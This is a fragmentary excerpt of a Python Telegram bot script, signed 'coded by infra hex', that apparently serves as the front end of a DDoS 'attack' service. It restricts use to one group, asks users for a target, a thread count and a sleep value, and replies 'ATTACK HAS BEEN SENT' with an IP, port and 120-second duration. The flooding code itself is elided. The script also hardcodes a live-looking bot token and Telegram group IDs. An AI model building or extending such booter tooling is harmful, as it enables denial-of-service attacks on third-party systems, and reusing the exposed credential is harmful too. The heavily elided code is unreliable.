...
bot_token = '7416084399:AAHYQfBC86_oNqsQgHfTd_BsHiPGa-Tg__w'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -4681489332
...
def handle_non_group_message(message):
    bot.reply_to(message, text='𝐵𝑜𝑡 𝑜𝑛𝑙𝑦 𝑤𝑜𝑟𝑘 𝑖𝑛 : https://t.me/+7qKH0oqLUQ9jZGE1')
...
user_states = {}  # Dictionary to track user input states
...
def handle_user_input(message):
    ...
    if user_data["step"] == "awaiting_number":
        if message.text.isdigit():
            ...
            os.system("echo")  # Auto-execute Enter key
        ...
        if message.text.isdigit():
            ...
            print(f"{user_data['threads']}", flush=True)  # Print in terminal
            time.sleep(0.5)  # Simulate slight delay
            os.system("echo")  # Auto-execute Enter key
        ...
        if message.text.isdigit():
            ...
            print(f"{user_data['sleep']}", flush=True)  # Print in terminal
            time.sleep(0.5)  # Simulate slight delay
            os.system("echo")  # Auto-execute Enter key
...
#coded by infra hex
        ...
        bot.reply_to(message, f"ATTACK HAS BEEN SENT\n TARGET:  {ip} :port {port} \n FINISH IT ON 120 seconds")
